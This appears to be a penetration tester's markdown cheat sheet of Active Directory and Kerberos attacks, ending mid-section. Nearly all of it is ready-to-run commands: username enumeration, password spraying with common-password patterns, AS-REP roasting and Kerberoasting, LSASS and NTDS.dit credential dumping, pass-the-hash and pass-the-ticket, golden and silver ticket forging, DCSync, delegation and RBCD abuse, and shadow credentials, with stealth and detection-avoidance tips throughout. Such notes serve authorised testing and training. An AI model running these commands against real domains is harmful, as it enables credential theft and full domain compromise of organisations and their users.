---
tags:
  - Active_Directory
  - Foundational
  - Kerberos
  - Windows
---
## Active Directory and Kerberos Attacks
> Comprehensive AD attack methodology including Kerberos exploitation, credential dumping, lateral movement, and privilege escalation.
> **Core Tools:** Impacket, Mimikatz, Rubeus, Kerbrute, NetExec, BloodHound, Certipy, hashcat

## AD Initial Setup
> Set environment variables and configure DNS for AD attacks.

### Environment Variables
```bash
export DC_IP=<DC_IP>
export DOMAIN=<Domain>
export USER=<User>
export PASS='<Password>'
export TARGET=<TargetIP>
```

### DNS Configuration
```bash
echo "nameserver $DC_IP" | sudo tee /etc/resolv.conf
```

## Enumeration Without Credentials

### Kerberos Port 88 Enumeration
```bash
nmap -sV -p 88 <DC_IP>
nmap -p 88,389,445,464,3268 -sV <DC_IP>
```

### Username Enumeration - Kerbrute
> Enumerate valid AD usernames via Kerberos pre-auth. No credentials required.
> Valid user returns `KDC_ERR_PREAUTH_REQUIRED`. Invalid user returns `KDC_ERR_C_PRINCIPAL_UNKNOWN`.

> **Recommended wordlists:**
> `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`
> Custom list based on company naming convention (first.last, flast, firstl)
> Names from LinkedIn, company website, OSINT

```bash
kerbrute userenum -d <Domain> --dc <DC_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

### [Alternate] Nmap Kerberos User Enumeration
```bash
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<Domain>',userdb=<UsernameFile> <DC_IP>
```

### RID Cycling - Anonymous
> Enumerate users via SID brute-forcing. Works with null session if allowed.

```bash
netexec smb <DC_IP> -u '' -p '' --rid-brute
lookupsid.py anonymous@<DC_IP>
```

### LDAP Anonymous Bind
```bash
ldapsearch -x -H ldap://<DC_IP> -s base namingcontexts
ldapsearch -x -H ldap://<DC_IP> -b "DC=corp,DC=local"
```

### Dump LDAP Users - GetADUsers
> Enumerate all domain users via LDAP. Requires valid credentials or anonymous bind.

```bash
impacket-GetADUsers -all -no-pass -dc-ip <DC_IP> <Domain>/
impacket-GetADUsers -all -dc-ip <DC_IP> <Domain>/<User>:<Password>
```

### Initial Credential Guessing
> Try obvious passwords before large-scale spraying.

```bash
nxc smb <TargetIP> -u users.txt -p users.txt -d <Domain> --continue-on-success
nxc smb <TargetIP> -u administrator -p password -d <Domain>
nxc smb <TargetIP> -u admin -p admin --local-auth
```

> **Common Password Patterns:**
> **Seasonal:** Spring2024!, Winter2024!, Summer2024!, Fall2024!
> **Monthly:** January2024!, December2024!
> **Company-based:** CompanyName1!, CompanyName123!
> **Defaults:** Welcome1!, Changeme1!, P@ssw0rd!

## Enumeration With Credentials

### NetExec Comprehensive Enum
```bash
netexec smb <DC_IP> -u <User> -p <Pass> --shares
netexec smb <DC_IP> -u <User> -p <Pass> --users
netexec smb <DC_IP> -u <User> -p <Pass> --groups
netexec smb <DC_IP> -u <User> -p <Pass> --pass-pol
netexec smb <DC_IP> -u <User> -p <Pass> -M spider_plus
netexec ldap <DC_IP> -u <User> -p <Pass> -M get-desc-users
netexec ldap <DC_IP> -u <User> -p <Pass> --computers
```

### ldapdomaindump
> Dumps comprehensive AD information via LDAP. Outputs HTML reports, JSON, and grep-friendly text.

```bash
ldapdomaindump -u "<Domain>\\<User>" -p "<Pass>" ldap://<DC_IP>
sudo ldapdomaindump ldaps://<DC_IP> -u '<Domain>\<Username>' -p '<Password>' -o <OutputDirectory>
```

### RID Cycling - Authenticated
```bash
lookupsid.py <Domain>/<User>:<Password>@<TargetIP>
```

### BloodHound Collection
```bash
netexec ldap <DC_IP> -u <User> -p <Pass> --bloodhound -ns <DC_IP> -c All
bloodhound-python -d <Domain> -dc <DC> -c All -u '<User>' -p '<Pass>' -ns <DC_IP>
```

```powershell
SharpHound.exe -c All
SharpHound.exe -c All --ldapusername <User> --ldappassword <Pass>
Invoke-BloodHound -CollectionMethod All
```

## AD Native Enumeration
> Built-in Windows tools for Active Directory enumeration. No external tools required.

### List Domain Users
```cmd
net user /domain
```

### Get Domain User Details
```cmd
net user <Username> /domain
```

### List Domain Groups
```cmd
net group /domain
```

### List Group Members
```cmd
net group "<GroupName>" /domain
net group "Domain Admins" /domain
```

### Add User to Domain Group [optional]
> Requires appropriate permissions (Domain Admin or delegated).

```cmd
net group "<GroupName>" <Username> /add /domain
```

### Bypass Execution Policy
```powershell
powershell -ExecutionPolicy Bypass
```

### List SPNs for Account
> Find service accounts for Kerberoasting.

```cmd
setspn -L <AccountName>
```

### List Group Members - PowerShell
> Requires AD PowerShell module (RSAT).

```powershell
Get-ADGroupMember -Identity "Domain Admins" | select name
```

### Browse SYSVOL Share
> SYSVOL contains Group Policy scripts and settings. May contain credentials.

```powershell
ls \\<Domain>\SYSVOL\<Domain>\Policies
ls \\<Domain>\SYSVOL\<Domain>\scripts
```

## PowerView Enumeration
resources: [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

> PowerShell AD enumeration tool. Run from domain-joined Windows host.

### Load PowerView
```powershell
Import-Module .\PowerView.ps1
powershell -ep bypass
. .\PowerView.ps1
```

### Domain Enumeration
```powershell
Get-NetDomain
Get-DomainController
Get-NetUser | select cn,description
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Get-DomainUser -PreauthNotRequired
Get-NetGroup | select samaccountname
Get-NetGroup "Domain Admins" | select member
Get-DomainGroupMember -Identity "Domain Admins"
Get-NetComputer | select dnshostname,operatingsystem
Get-NetComputer -Ping | select dnshostname, operatingsystem
Get-DomainComputer -Unconstrained
```

### Session and Admin Access
```powershell
Get-NetLoggedon -ComputerName <ComputerName>
Get-NetSession -ComputerName <ComputerName> -Verbose
Find-DomainUserLocation -User <Username>
Find-LocalAdminAccess -Verbose
```

> **Get-NetLoggedon** requires local admin on target. **Get-NetSession** works on file servers and DCs.

### ACL Enumeration
```powershell
Get-ObjectAcl -Identity "<DistinguishedName_or_Name>" -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs
Convert-SidToName <SID_String>
Get-ObjectAcl -Identity "Domain Admins" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

### Share Enumeration
```powershell
Find-DomainShare
Find-DomainShare -CheckShareAccess -Verbose
```

### Delegation Enumeration
```powershell
Get-DomainComputer -Unconstrained
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

### GPO Enumeration
```powershell
Get-NetGPO | select displayname
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
```

## Other Enumeration Tools

### PingCastle - AD Security Audit
> Quick AD security audit with risk scoring. Generates HTML report.

```cmd
.\PingCastle.exe --healthcheck
```

### PsLoggedOn - Session Enumeration
> Sysinternals tool to find logged-on users.

```cmd
.\PsLoggedon.exe
.\PsLoggedon.exe \\<ComputerName>
```

### Plumhound - BloodHound Analysis
> Automated BloodHound analysis. Generates HTML reports from Neo4j data.

```bash
cd /path/to/PlumHound
source bin/activate
sudo python3 PlumHound.py -x tasks.default.tasks -p <Neo4jPassword>
firefox reports/index.html
```

### Remote Service Enumeration
```bash
services.py <Domain>/<User>:<Password>@<TargetIP> list
services.py <Domain>/<User>:<Password>@<TargetIP> query <ServiceName>
```

#### Start/Stop Service [optional]
> Requires admin privileges.

```bash
services.py <Domain>/<AdminUser>:<Password>@<TargetIP> start <ServiceName>
services.py <Domain>/<AdminUser>:<Password>@<TargetIP> stop <ServiceName>
```

### View Kerberos Tickets
```bash
klist
```

```powershell
klist
```

## Credential Hunting

### PowerShell History
> Check for credentials accidentally typed in commands.

```powershell
(Get-PSReadlineOption).HistorySavePath
Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-Content (Get-PSReadlineOption).HistorySavePath | Select-String -Pattern 'password|secret|key'
```

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Search Files for Passwords
```cmd
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
findstr /si password *.config
dir /s /b *pass*
dir /s /b *cred*
dir /s /b *.config
```

### Search Registry for Passwords
> HKLM search requires Admin privileges.

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### KeePass Database Cracking
```cmd
dir /s /b C:\*.kdbx
```

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

```bash
/usr/share/john/keepass2john Database.kdbx > keepass.hash
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
john --show keepass.hash
```

### Keytab File Extraction
resources: [KeyTabExtract GitHub](https://github.com/sosdave/KeyTabExtract)

> Keytab files contain Kerberos principal keys. Found on Linux servers with Kerberos integration.

#### Common Keytab Locations
> `/etc/krb5.keytab` - Default system keytab
> `/var/lib/sss/db/` - SSSD keytab cache
> `/tmp/krb5cc_*` - User ticket cache files

#### Extract Keys with KeyTabExtract
```bash
python KeyTabExtract.py <KeytabFile>
```

#### Convert to Hashcat Format
```bash
python KeyTabExtract.py <KeytabFile> --hash
```

#### Use Keytab for Authentication
```bash
kinit -kt <KeytabFile> <Principal>
klist
```

## Password Spraying

### Password Spraying - SMB
```bash
netexec smb <TargetIPRange> -u users.txt -p '<Password>' --continue-on-success
```

### Password Spraying - Kerberos
```bash
kerbrute passwordspray -d <Domain> --dc <DC_IP> users.txt '<Password>'
```

## AS-REP Roasting

### AS-REP Roasting - No Credentials
> Target users with "Do not require Kerberos preauthentication" enabled.
> These users' password hashes can be requested WITHOUT knowing their password.

```bash
impacket-GetNPUsers <Domain>/ -usersfile users.txt -format hashcat -outputfile asrep.txt -no-pass -dc-ip <DC_IP>
```

### AS-REP Roasting - With Credentials
> With valid credentials, query LDAP to find all AS-REP roastable users automatically.

```bash
impacket-GetNPUsers <Domain>/<User>:<Pass> -request -format hashcat -outputfile asrep.txt -dc-ip <DC_IP>
```

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

### AS-REP Roasting - Rubeus (Windows)
```powershell
Rubeus.exe asreproast /outfile:asrep.txt /format:hashcat
Rubeus.exe asreproast /format:john /outfile:hash.txt
```

### Crack AS-REP Hashes
```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
```

### Use AS-REP Hash with SMBClient
> Access SMB shares using NT hash from cracked AS-REP roasted user.

```bash
smbclient '\\<TargetIP>\<Share>' -L <DC_IP> -W <Domain> -U <User>%<NTHash> --pw-nt-hash
```

### Targeted AS-REP Roasting
> If you have GenericWrite/GenericAll on a user, disable their Kerberos pre-authentication.

#### Enable ASREPRoast Vulnerability
> Disables Kerberos pre-authentication for a user, making the account vulnerable to AS-REP Roasting.
> Requires Domain Admin, Account Operator, or delegated permissions.
> **To remediate:** Set `-DoesNotRequirePreAuth $false`

```powershell
Set-ADAccountControl -Identity <Username> -DoesNotRequirePreAuth $true
```

#### [Alternate] Using UserAccountControl
```powershell
$uac = (Get-ADUser -Identity <TargetUser> -Properties UserAccountControl).UserAccountControl
$newUac = $uac -bor 0x400000
Set-ADUser -Identity <TargetUser> -UserAccountControl $newUac
```

#### Perform AS-REP Roast
```bash
impacket-GetNPUsers <Domain>/ -dc-ip <DC_IP> -usersfile target_user.txt -format hashcat -outputfile target_hash.txt
```

#### Crack Hash
```bash
hashcat -m 18200 target_hash.txt <Wordlist>
```

#### Revert Pre-Auth Setting [optional]
```powershell
Set-ADAccountControl -Identity <TargetUser> -DoesNotRequirePreAuth $false
```

## Kerberoasting

### Request TGS Tickets
> Any authenticated user can request service tickets. Crack offline to get service account passwords.
> **Weak targets:** Service accounts with SPNs (HTTP/, MSSQL/, CIFS/), non-random passwords, high-privilege accounts.

```bash
impacket-GetUserSPNs -request -dc-ip <DC_IP> <Domain>/<User>:<Pass>
impacket-GetUserSPNs -request -dc-ip <DC_IP> <Domain>/<User> -hashes :<NTHash>
impacket-GetUserSPNs -request -dc-ip <DC_IP> <Domain>/<User>:<Pass> -outputfile tgs.txt
```

### Kerberoasting - NetExec
```bash
nxc ldap <DC_IP> -u <User> -p <Pass> --kerberoasting kerberoast.txt
```

### Kerberoasting - Rubeus (Windows)
```powershell
Rubeus.exe kerberoast /outfile:tgs.txt
Rubeus.exe kerberoast /user:<TargetUser> /nowrap
```

### Crack TGS Hashes
```bash
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### [Alternate] Crack AES-256 Kerberoast Hash
> Some environments use AES encryption instead of RC4.

```bash
hashcat -m 19700 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Targeted Kerberoasting
> If you have GenericWrite/GenericAll on a user, add a fake SPN to make them Kerberoastable.

#### Add Fake SPN - PowerShell
```powershell
Set-DomainObject -Identity <TargetUser> -SET @{serviceprincipalname='fake/spn'}
```

```powershell
$user = Get-ADUser -Identity <TargetUser>
$currentSPNs = $user.ServicePrincipalNames
Set-ADUser -Identity <TargetUser> -ServicePrincipalNames ($currentSPNs + "HTTP/fakehost.<Domain>")
```

#### [Alternate] Using setspn
```cmd
setspn -S HTTP/fakehost.<Domain> <TargetUser>
```

#### Add Fake SPN - Linux
```bash
bloodyAD -d <Domain> -u <User> -p <Pass> --host <DC_IP> set object <TargetUser> servicePrincipalName -v "fake/spn"
```

#### Perform Kerberoast
```bash
impacket-GetUserSPNs -request -dc-ip <DC_IP> <Domain>/<User>:<Pass> -outputfile roast.txt
nxc ldap <DC_IP> -u <User> -p <Pass> --kerberoasting kerberoast.txt
```

```powershell
Rubeus.exe kerberoast /user:<TargetUser> /nowrap
```

#### Crack Hash
```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r best64.rule
```

#### Remove Fake SPN [optional]
```cmd
setspn -D HTTP/fakehost.<Domain> <TargetUser>
```

```powershell
Set-DomainObject -Identity <TargetUser> -Clear serviceprincipalname
```

```bash
bloodyAD -d <Domain> -u <User> -p <Pass> --host <DC_IP> set object <TargetUser> servicePrincipalName
```

## Credential Dumping

### Mimikatz - Local
```
privilege::debug
sekurlsa::logonpasswords
lsadump::lsa /patch
lsadump::sam
lsadump::secrets
lsadump::cache
sekurlsa::tickets /export
```

### LSASS with Procdump
```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

### LSASS with comsvcs.dll
```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full
```

### Registry Hives
```cmd
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive
```

```bash
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
```

### Remote Secretsdump
```bash
impacket-secretsdump <Domain>/<User>:<Pass>@<TargetIP>
impacket-secretsdump <Domain>/<User>@<TargetIP> -hashes :<NTHash>
```

## Pass-the-Hash

### psexec
```bash
impacket-psexec <Domain>/<User>@<TargetIP> -hashes :<NTHash>
```

### wmiexec
```bash
impacket-wmiexec <Domain>/<User>@<TargetIP> -hashes :<NTHash>
```

### smbexec
```bash
impacket-smbexec <Domain>/<User>@<TargetIP> -hashes :<NTHash>
```

### atexec
```bash
impacket-atexec <Domain>/<User>@<TargetIP> -hashes :<NTHash> "whoami"
```

### NetExec
```bash
netexec smb <TargetIP> -u <User> -H <NTHash> -d <Domain> -x "whoami"
```

### Mimikatz
```
privilege::debug
sekurlsa::pth /user:<User> /domain:<Domain> /ntlm:<NTHash> /run:cmd.exe
```

## Pass-the-Ticket

> Use stolen or forged Kerberos tickets to authenticate without password or hash.
> **Requirements:** Valid TGT or TGS ticket, DNS resolution working (Kerberos uses hostnames), time sync within 5 minutes of DC.

### Ticket Sources
> **Mimikatz** - `.kirbi` format via `sekurlsa::tickets /export`
> **Rubeus** - `.kirbi` format via `Rubeus.exe dump`
> **Impacket** - `.ccache` format via `getTGT.py`, `getST.py`
> **Linux tools** - `.ccache` format (most Python tooling)

### When to Use Ticket Auth
> **NTLM disabled** - Only Kerberos allowed on target
> **Stolen ticket** - Got ticket from memory, no hash needed
> **Golden/Silver Ticket** - Forged ticket for persistence
> **Avoiding detection** - Can be stealthier than PTH

### Convert Ticket Formats
```bash
ticketConverter.py ticket.kirbi ticket.ccache
ticketConverter.py ticket.ccache ticket.kirbi
```

### Load Ticket - Linux
```bash
export KRB5CCNAME=/full/path/to/ticket.ccache
klist
```

### Pass-the-Ticket - Mimikatz
```
kerberos::ptt /ticket:C:\path\to\ticket.kirbi
dir \\<DC>\C$
```

### Pass-the-Ticket - Rubeus
```powershell
Rubeus.exe ptt /ticket:C:\path\to\ticket.kirbi
Rubeus.exe ptt /ticket:<Base64Ticket>
```

### Verify Ticket Loaded (Windows)
```powershell
klist
```

### Use Native Tools (Windows)
```powershell
dir \\<Hostname>\C$
PsExec.exe \\<Hostname> cmd.exe
Enter-PSSession -ComputerName <Hostname>
```

### Impacket Execution with Ticket
```bash
impacket-psexec <Domain>/<User>@<TargetIP> -k -no-pass
impacket-psexec -k -no-pass <TargetFQDN>
impacket-smbexec -k -no-pass <TargetFQDN>
impacket-wmiexec -k -no-pass <TargetFQDN>
impacket-secretsdump <Domain>/<User>@<DC_IP> -k -no-pass
```

### SMB File Access with Ticket
```bash
smbclient -k //<TargetFQDN>/C$
```

## Overpass-the-Hash

> Use NTLM hash or AES key to request a Kerberos TGT. More stealthy than straight PTH since you use legitimate Kerberos auth.
> **Requirements:** Valid NTLM hash or AES key, network access to DC (port 88), target must be specified by FQDN when using ticket.
> **OPSEC Note:** AES keys are stealthier than RC4/NTLM - RC4 in Kerberos traffic is an anomaly on modern domains.

### Request TGT - Linux
```bash
impacket-getTGT <Domain>/<User> -hashes :<NTHash>
getTGT.py -hashes :<NTHash> <Domain>/<User>
getTGT.py -aesKey <AESKey> <Domain>/<User>
```

### Load and Verify Ticket - Linux
```bash
export KRB5CCNAME=<User>.ccache
export KRB5CCNAME=$(pwd)/<User>.ccache
klist
```

### Use with Impacket Tools
> FQDN required when using Kerberos tickets.

```bash
impacket-psexec <Domain>/<User>@<TargetIP> -k -no-pass
impacket-psexec -k -no-pass <TargetFQDN>
impacket-secretsdump -k -no-pass <DCFQDN>
impacket-wmiexec -k -no-pass <TargetFQDN>
```

### Request TGT - Rubeus (Windows)
```powershell
Rubeus.exe asktgt /user:<User> /rc4:<NTHash> /ptt
Rubeus.exe asktgt /user:<User> /aes256:<AESKey> /ptt
```

### Use Native Tools After Injection (Windows)
```powershell
dir \\<Hostname>\c$
PsExec.exe \\<Hostname> cmd.exe
Enter-PSSession -ComputerName <Hostname>
```

## Silver Ticket (Service Access)

> Forge TGS for specific service using service account NTLM hash.

### Get Domain SID
```powershell
whoami /user
```

> Extract SID (remove final RID): `S-1-5-21-xxxxxxxx-xxxxxxx-xxxxxxxx`

```bash
lookupsid.py <Domain>/<User>:<Pass>@<DC_IP>
```

### Dump Service Hashes with Mimikatz
```powershell
privilege::debug
sekurlsa::logonpasswords
```

### Create Silver Ticket - Mimikatz
> Example for IIS HTTP service.

```
kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /target:<TargetServer> /service:<ServiceName> /rc4:<ServiceHash> /ptt
kerberos::golden /sid:<DomainSID> /domain:<Domain> /ptt /target:<TargetHost> /service:http /rc4:<ServiceNTHash> /user:<FakeUser>
```

### Create Silver Ticket - Impacket
```bash
impacket-ticketer -nthash <SvcHash> -domain-sid <DomainSID> -domain <Domain> -spn cifs/<Target> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec <Domain>/Administrator@<Target> -k -no-pass
```

### List Tickets
```powershell
klist
```

### Use Service with Ticket
```powershell
iwr -UseDefaultCredentials http://<TargetHost>
```

## Golden Ticket (Domain Persistence)

> Forge TGT using krbtgt hash. Provides access to entire domain.
> Requires krbtgt NTLM hash and domain SID.

### Dump krbtgt Hash
> Run on Domain Controller.

```
privilege::debug
lsadump::lsa /patch
```

### Create Golden Ticket - Mimikatz
```
kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /krbtgt:<KrbtgtHash> /ptt
kerberos::purge
kerberos::golden /user:<AdminUser> /domain:<Domain> /sid:<DomainSID> /krbtgt:<KrbtgtHash> /ptt
misc::cmd
```

### Create Golden Ticket - Impacket
```bash
lookupsid.py <Domain>/<User>:<Pass>@<DC_IP>
impacket-ticketer -nthash <KrbtgtHash> -domain-sid <DomainSID> -domain <Domain> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec <Domain>/Administrator@<DC_IP> -k -no-pass
```

### Access Domain Controller
```powershell
PsExec.exe \\dc1 cmd.exe
dir \\<DC>\C$
```

## DCSync Attack

> Requires Replicating Directory Changes permissions (Domain Admin or delegated).
> Replicate domain credentials using Directory Replication Service.

### DCSync with Secretsdump
```bash
impacket-secretsdump <Domain>/<User>:<Pass>@<DC_IP> -just-dc-ntlm
impacket-secretsdump <Domain>/<User>:<Pass>@<DC_IP> -just-dc-user Administrator
impacket-secretsdump -just-dc <Domain>/<User>:<Pass>@<DC_IP>
```

### DCSync with Mimikatz
```
lsadump::dcsync /domain:<Domain> /user:Administrator
lsadump::dcsync /domain:<Domain> /all /csv
```

### Dump NTDS.dit from DC
```cmd
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### Crack DCSync Hash
```bash
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt --force
```

## Delegation Attacks

### Delegation Discovery
> Unconstrained delegation: `TRUSTED_FOR_DELEGATION` flag
> Constrained delegation: `msDS-AllowedToDelegateTo` attribute

```powershell
Get-DomainComputer -Unconstrained
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

```bash
findDelegation.py <Domain>/<User>:<Pass> -dc-ip <DC_IP>
```

### Unconstrained Delegation
> **Requirements:**
> Compromise of unconstrained delegation machine (non-DC)
> Ability to coerce DC authentication (PrinterBug, PetitPotam)
> Network access to DC (port 88)

> Machines with unconstrained delegation store the TGT of any user that connects. Compromise the machine + coerce DC authentication = DC's TGT -> DCSync.

#### Enumeration with BloodHound
```cypher
MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT (c)-[:MemberOf]->(:Group {name:'DOMAIN CONTROLLERS@<DOMAIN>'}) RETURN c.name
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
```

#### [Alternate] Enumeration with PowerView
```powershell
Get-NetComputer -Unconstrained
```

#### [Alternate] Enumeration with NetExec
```bash
nxc ldap <DC_IP> -u <User> -p <Pass> --trusted-for-delegation
```

#### Step 1 - Compromise Unconstrained Delegation Machine
> Gain code execution on the machine with unconstrained delegation enabled.

#### Step 2 - Monitor for Incoming TGTs
```powershell
Rubeus.exe monitor /interval:5 /filteruser:DC01$
```

#### Step 3 - Coerce DC to Authenticate
```bash
printerbug.py <Domain>/<User>:<Pass>@<DC_IP> <CompromisedHost>
PetitPotam.py <CompromisedHost> <DC_IP>
```

#### Step 4 - Use Captured DC TGT for DCSync
```bash
export KRB5CCNAME=DC01$.ccache
secretsdump.py -k -no-pass <DC_FQDN>
```

### Constrained Delegation
> **Requirements:**
> Control of delegating account (password or hash)
> Target SPN in `msDS-AllowedToDelegateTo` attribute
> Network access to target service

> Accounts with constrained delegation can impersonate any user to specific services (SPNs) via S4U2Self/S4U2Proxy.
> The SPN service class can often be substituted. If delegation is to `time/target`, try `cifs/target`.

#### Enumeration with BloodHound
```cypher
## Users
MATCH (u:User {trustedtoauth:true}) RETURN u.name, u.allowedtodelegate

## Computers
MATCH (c:Computer {trustedtoauth:true}) RETURN c.name, c.allowedtodelegate

## All
MATCH (c) WHERE c.allowedtodelegate IS NOT NULL RETURN c.name, c.allowedtodelegate
MATCH (u:User) WHERE u.allowedtodelegate IS NOT NULL RETURN u.name, u.allowedtodelegate
```

#### [Alternate] Enumeration with PowerView
```powershell
## Users
Get-DomainUser -TrustedToAuth

## Computers
Get-DomainComputer -TrustedToAuth
```

#### [Alternate] Enumeration with NetExec
```bash
nxc ldap <DC_IP> -u <User> -p <Pass> --trusted-for-delegation
```

#### Exploit Constrained Delegation
```bash
impacket-getST -spn cifs/<TargetIP> -impersonate Administrator <Domain>/<SvcUser> -hashes :<NTHash>
getST.py -spn cifs/<TargetFQDN> -impersonate Administrator <Domain>/<User>:<Pass>
getST.py -spn cifs/<TargetFQDN> -impersonate Administrator -hashes :<NTHash> <Domain>/<User>
export KRB5CCNAME=Administrator.ccache
impacket-psexec <Domain>/Administrator@<TargetIP> -k -no-pass
impacket-psexec -k -no-pass <TargetFQDN>
```

### Resource-Based Constrained Delegation (RBCD)
> **Requirements:**
> `GenericWrite`, `GenericAll`, `WriteDacl`, or `WriteOwner` on target computer
> Ability to create machine account (MAQ > 0) or control of existing one
> Network access to target (port 445)

> If you have write access to a computer object, configure it to trust a machine you control, then impersonate admin users to it.
> Requires GenericAll/GenericWrite on a computer object.

#### Enumeration with BloodHound
```cypher
## Find write access to computers
MATCH p=(u)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(c:Computer) RETURN p
MATCH p=(n)-[:GenericWrite|GenericAll|Owns|WriteDacl|WriteOwner|AddAllowedToAct]->(c:Computer) RETURN p
```

#### [Alternate] Enumeration with PowerView
```powershell
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? {
  $_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite"
}
```

#### Check MachineAccountQuota
```bash
nxc ldap <DC_IP> -u <User> -p <Pass> -M maq
```

#### Step 1 - Create Machine Account
```bash
impacket-addcomputer <Domain>/<User>:<Pass> -computer-name 'YOURPC$' -computer-pass 'Password123'
addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password123!' -dc-host <DC_IP> <Domain>/<User>:<Pass>
```

#### Step 2 - Configure RBCD on Target
```bash
impacket-rbcd <Domain>/<User>:<Pass> -dc-ip <DC_IP> -action write -delegate-to <Target>$ -delegate-from YOURPC$
rbcd.py -delegate-from 'YOURPC$' -delegate-to '<TargetComputer>$' -action write <Domain>/<User>:<Pass>
```

#### Step 3 - Get Service Ticket as Admin
```bash
impacket-getST -spn cifs/<Target> -impersonate Administrator <Domain>/YOURPC$:'Password123'
getST.py -spn cifs/<TargetFQDN> -impersonate Administrator <Domain>/YOURPC$:'Password123!'
```

#### Step 4 - Use the Ticket
```bash
export KRB5CCNAME=Administrator.ccache
impacket-psexec <Domain>/Administrator@<Target> -k -no-pass
impacket-psexec -k -no-pass <TargetFQDN>
```

#### RBCD Cleanup [optional]
> **Troubleshooting:**
> **Can't create machine account** (MAQ = 0): Use existing machine account you control
> **RBCD write fails** (No write permission): Verify ACLs in BloodHound
> **getST.py fails** (S4U issues): Check account types, target must be computer
> **Ticket doesn't work** (Wrong SPN or hostname): Use FQDN, verify DNS

##### Remove RBCD Configuration [optional]
```bash
rbcd.py -delegate-to '<TargetComputer>$' -action flush <Domain>/<User>:<Pass>
```

##### Delete Machine Account [optional]
```bash
addcomputer.py -computer-name 'YOURPC$' -delete -dc-host <DC_IP> <Domain>/<User>:<Pass>
```

## ACL Abuse

> Use BloodHound to identify ACL misconfigurations.

### GenericAll on User
> GenericAll on a user object = full control. You can reset their password, Kerberoast them, or add Shadow Credentials.
> **Attack options:** Targeted Kerberoast (quiet), Shadow Credentials (quiet, requires ADCS/Win2016+), Password Reset (loud).
> **Preferred order:** Targeted Kerberoast -> Shadow Credentials -> Password Reset

#### Targeted Kerberoasting (Preferred)
> Set an SPN on the target, request a ticket, crack offline. User doesn't notice.

```bash
bloodyAD -d <Domain> -u <User> -p <Pass> --host <DC_IP> set object <TargetUser> servicePrincipalName -v "fake/spn"
```

```bash
nxc ldap <DC_IP> -u <User> -p <Pass> --kerberoasting kerberoast.txt
```

```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r best64.rule
```

##### Targeted Kerberoasting - Windows
```powershell
Set-DomainObject -Identity <TargetUser> -SET @{serviceprincipalname='fake/spn'}
```

```powershell
Rubeus.exe kerberoast /user:<TargetUser> /nowrap
```

```powershell
Set-DomainObject -Identity <TargetUser> -Clear serviceprincipalname
```

#### Shadow Credentials
> Add certificate-based credential. Stealthy, doesn't change password. Requires ADCS or Win2016+ DC.

```bash
python3 pywhisker.py -d <Domain> -u <User> -p <Pass> --target <TargetUser> --action add --dc-ip <DC_IP>
```

```bash
python3 gettgtpkinit.py -cert-pfx <TargetUser>.pfx -pfx-pass <PfxPassword> <Domain>/<TargetUser> <TargetUser>.ccache
```

```bash
python3 getnthash.py -key <AS_REP_Key> <Domain>/<TargetUser>
```

##### Shadow Credentials - Windows
```powershell
Whisker.exe add /target:<TargetUser>
```

##### Remove Shadow Credential [optional]
```bash
python3 pywhisker.py -d <Domain> -u <User> -p <Pass> --target <TargetUser> --action remove --device-id <DeviceID>
```

#### Password Reset (Loud)
> Reset password directly. Fast but user will know.

```bash
bloodyAD -d <Domain> -u <User> -p <Pass> --host <DC_IP> set password <TargetUser> 'NewPassword123!'
```

```bash
net rpc password <TargetUser> 'NewPassword123!' -U "<Domain>/<User>%<Pass>" -S <DC_IP>
```

```powershell
